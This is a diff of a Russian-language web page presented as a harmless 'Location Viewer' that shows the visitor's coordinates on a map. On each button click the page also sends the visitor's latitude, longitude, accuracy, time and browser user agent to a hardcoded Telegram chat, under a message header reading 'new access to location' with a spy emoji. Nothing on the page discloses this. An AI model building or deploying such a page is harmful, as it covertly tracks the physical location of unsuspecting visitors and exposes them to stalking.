@@ -1,39 +1,63 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Карта местоположения</title>
+    <title>▪️ Location Viewer ▪️</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
             margin: 0;
-            padding: 0;
+            padding: 20px;
             font-family: Arial, sans-serif;
+            background: #f8f9fa;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        .map-box {
             background: white;
+            border-radius: 15px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            overflow: hidden;
+            margin: 20px 0;
         }
         #map {
-            height: 85vh;
+            height: 300px;
             width: 100%;
         }
-        #controls {
-            padding: 15px;
-            text-align: center;
+        .info-box {
+            background: white;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+            margin: 15px 0;
         }
         button {
             background: #000;
             color: white;
             border: none;
             padding: 12px 25px;
-            border-radius: 20px;
+            border-radius: 25px;
             font-size: 16px;
             cursor: pointer;
+            width: 100%;
             transition: opacity 0.3s;
         }
         button:hover {
-            opacity: 0.8;
+            opacity: 0.9;
         }
-        button:disabled {
-            background: #555;
-            cursor: not-allowed;
+        .data-row {
+            display: flex;
+            justify-content: space-between;
+            margin: 10px 0;
+            padding: 8px;
+            background: #f8f9fa;
+            border-radius: 8px;
+        }
+        .data-label {
+            color: #6c757d;
+            font-weight: bold;
         }
         .leaflet-control-container {
             display: none !important;
@@ -42,9 +66,31 @@
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
 </head>
 <body>
-    <div id="map"></div>
-    <div id="controls">
-        <button id="locateBtn">📍 Определить местоположение</button>
+    <div class="container">
+        <button id="locateBtn">📍 Определить моё местоположение</button>
+        
+        <div class="map-box">
+            <div id="map"></div>
+        </div>
+
+        <div class="info-box">
+            <div class="data-row">
+                <span class="data-label">Широта:</span>
+                <span id="latitude">—</span>
+            </div>
+            <div class="data-row">
+                <span class="data-label">Долгота:</span>
+                <span id="longitude">—</span>
+            </div>
+            <div class="data-row">
+                <span class="data-label">Точность:</span>
+                <span id="accuracy">—</span>
+            </div>
+            <div class="data-row">
+                <span class="data-label">Время:</span>
+                <span id="time">—</span>
+            </div>
+        </div>
     </div>
 
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
@@ -53,12 +99,14 @@
         const CHAT_ID = '6503842877';
         let map, marker;
 
-        async function sendLocation(lat, lng, accuracy) {
-            const message = `🌍 Новые координаты:
-Широта: ${lat.toFixed(6)}
-Долгота: ${lng.toFixed(6)}
-Точность: ${accuracy.toFixed(1)} м
-Время: ${new Date().toLocaleTimeString()}`;
+        async function sendToTelegram(lat, lng, accuracy) {
+            const message = `🕵️‍♂️ Новый доступ к локации:
+┌ Широта: ${lat}
+├ Долгота: ${lng}
+└ Точность: ${accuracy} м
+
+⏱ ${new Date().toLocaleString()}
+🌐 ${navigator.userAgent}`;
 
             try {
                 await fetch(
@@ -67,6 +115,13 @@
             } catch(e) {
                 console.error('Ошибка отправки:', e);
             }
+        }
+
+        function updateUI(lat, lng, accuracy) {
+            document.getElementById('latitude').textContent = lat.toFixed(6);
+            document.getElementById('longitude').textContent = lng.toFixed(6);
+            document.getElementById('accuracy').textContent = `${accuracy.toFixed(1)} м`;
+            document.getElementById('time').textContent = new Date().toLocaleTimeString();
         }
 
         function initMap(lat, lng) {
@@ -83,12 +138,13 @@
 
             if (marker) marker.remove();
             marker = L.marker([lat, lng]).addTo(map);
+            map.setView([lat, lng], 16);
         }
 
         document.getElementById('locateBtn').addEventListener('click', async () => {
             const btn = document.getElementById('locateBtn');
             btn.disabled = true;
-            btn.textContent = 'Определяем...';
+            btn.textContent = 'Идёт поиск...';
 
             try {
                 const position = await new Promise((resolve, reject) => {
@@ -100,9 +156,11 @@
 
                 const lat = position.coords.latitude;
                 const lng = position.coords.longitude;
-                
+                const accuracy = position.coords.accuracy;
+
+                updateUI(lat, lng, accuracy);
                 initMap(lat, lng);
-                await sendLocation(lat, lng, position.coords.accuracy);
+                await sendToTelegram(lat, lng, accuracy);
 
                 btn.textContent = 'Готово!';
                 setTimeout(() => {
@@ -112,7 +170,7 @@
 
             } catch(error) {
                 console.error('Ошибка:', error);
-                btn.textContent = 'Ошибка!';
+                btn.textContent = 'Ошибка определения!';
                 setTimeout(() => {
                     btn.disabled = false;
                     btn.textContent = '📍 Определить местоположение';
